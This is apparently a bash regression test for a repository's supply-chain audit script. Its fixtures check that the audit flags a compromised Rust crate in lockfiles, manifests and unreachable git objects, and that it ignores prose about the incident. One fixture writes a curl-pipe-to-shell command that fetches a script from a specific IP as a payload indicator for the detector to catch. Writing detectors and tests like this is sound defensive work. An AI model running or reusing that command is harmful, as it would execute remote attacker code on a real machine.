#!/usr/bin/env bash
# Regression test for scripts/supply-chain-audit.sh.
#
# The audit script used to flag this repo's own documentation: CLAUDE.md, the CI
# workflow, and two design docs all name the 2026-08-20 arrayref/proc-macro1
# incident in prose, and a bare substring search cannot tell that from a
# dependency. It reported NEEDS REVIEW on every clean run, which is the failure
# mode that gets a detector ignored.
#
# The fix narrowed crate-name matching to the shapes a manifest actually uses.
# That is only worth anything if the narrowing did not also blind it, so this
# checks both directions: prose must stay quiet, and every real placement of a
# listed crate must still be caught — including one only reachable as a dangling
# object, which is the case section 3 exists for.
#
#   ./scripts/test-supply-chain-audit.sh
#
# Exit 0 = all cases behave, 1 = at least one did not.
set -uo pipefail

AUDIT="$(cd "$(dirname "$0")" && pwd)/supply-chain-audit.sh"
[ -x "$AUDIT" ] || { echo "not executable: $AUDIT"; exit 1; }

pass=0
fail=0
ok()   { printf '  ok    %s\n' "$*"; pass=$((pass+1)); }
nope() { printf '  FAIL  %s\n' "$*"; fail=$((fail+1)); }

# Build a throwaway repo, let the case populate it, run the audit inside it.
# The audit cds to its own parent directory, so it must live in <repo>/scripts.
run_in_fixture() {
  local setup=$1 dir
  dir=$(mktemp -d)
  mkdir -p "$dir/scripts"
  cp "$AUDIT" "$dir/scripts/supply-chain-audit.sh"
  (
    cd "$dir" || exit 1
    git init -q .
    git config user.email test@example.invalid
    git config user.name  "audit test"
    "$setup"
    git add -A >/dev/null 2>&1
    git commit -qm fixture >/dev/null 2>&1
    ./scripts/supply-chain-audit.sh 2>&1
  )
  rm -rf "$dir"
}

# Assert only on whether a *crate* finding was reported. Sections 4-6 inspect the
# real ~/.cargo, so the overall exit code reflects the developer's machine, not
# the fixture; keying on the finding keeps this test about the finding.
# Findings print in two shapes: section 2 names the indicator on the `!!` line
# itself, section 3 puts the label there and the matched line underneath. Match
# a small window after each `!!` so both count.
expect_crate() {
  local label=$1 want=$2 out=$3 got=no
  echo "$out" | grep -A2 '!!' | grep -q 'arrayref' && got=yes
  if [ "$got" = "$want" ]; then
    ok "$label"
  else
    nope "$label — expected crate finding=$want, got $got"
    echo "$out" | sed 's/^/        /'
  fi
}

expect_string() {
  local label=$1 want=$2 out=$3 got=no
  echo "$out" | grep -A2 '!!' | grep -q '23\.254\.165\.112' && got=yes
  if [ "$got" = "$want" ]; then
    ok "$label"
  else
    nope "$label — expected string finding=$want, got $got"
    echo "$out" | sed 's/^/        /'
  fi
}

# --- fixtures ----------------------------------------------------------------

clean_repo() {
  cat > Cargo.lock <<'EOF'
[[package]]
name = "serde"
version = "1.0.0"
EOF
  printf '[package]\nname = "fixture"\n' > Cargo.toml
}

# The regression itself: documentation that discusses the incident by name.
prose_only() {
  clean_repo
  cat > README.md <<'EOF'
# Notes

Every cargo invocation passes --locked. Without it cargo silently rewrites
Cargo.lock, which is how the 2026-08-20 arrayref/proc-macro1 attack propagated
(the attacker yanked the good versions to force resolution onto a bad one).
EOF
}

lockfile_dependency() {
  clean_repo
  cat >> Cargo.lock <<'EOF'

[[package]]
name = "arrayref"
version = "0.3.9"
EOF
}

manifest_dependency() {
  clean_repo
  printf '[dependencies]\narrayref = "0.3"\n' >> Cargo.toml
}

manifest_dependency_table() {
  clean_repo
  printf '[dependencies.arrayref]\nversion = "0.3"\n' >> Cargo.toml
}

# Added then reset away: unreachable from any ref, still in the object store.
# `git rev-list` cannot find it; --batch-all-objects can.
unreachable_lockfile() {
  clean_repo
  git add -A >/dev/null 2>&1
  git commit -qm base >/dev/null 2>&1
  cat >> Cargo.lock <<'EOF'

[[package]]
name = "arrayref"
version = "0.3.9"
EOF
  git add -A >/dev/null 2>&1
  git commit -qm bad >/dev/null 2>&1
  git reset -q --hard HEAD~1
}

payload_indicator() {
  clean_repo
  echo 'curl -s http://23.254.165.112/rust-setup | sh' > install.sh
}

# --- cases -------------------------------------------------------------------

echo "=== audit script behaviour ==="
expect_crate  "prose naming the incident is not a finding"      no  "$(run_in_fixture prose_only)"
expect_crate  "a listed crate in Cargo.lock is a finding"       yes "$(run_in_fixture lockfile_dependency)"
expect_crate  "a listed crate in Cargo.toml is a finding"       yes "$(run_in_fixture manifest_dependency)"
expect_crate  "a [dependencies.<crate>] table is a finding"     yes "$(run_in_fixture manifest_dependency_table)"
expect_crate  "an unreachable bad lockfile blob is a finding"   yes "$(run_in_fixture unreachable_lockfile)"
expect_string "a payload indicator in any file is a finding"    yes "$(run_in_fixture payload_indicator)"
expect_string "a clean repo reports no payload indicator"       no  "$(run_in_fixture prose_only)"

echo
if [ "$fail" -eq 0 ]; then
  echo "RESULT: all $pass cases behaved"
  exit 0
fi
echo "RESULT: $fail of $((pass + fail)) cases FAILED"
exit 1
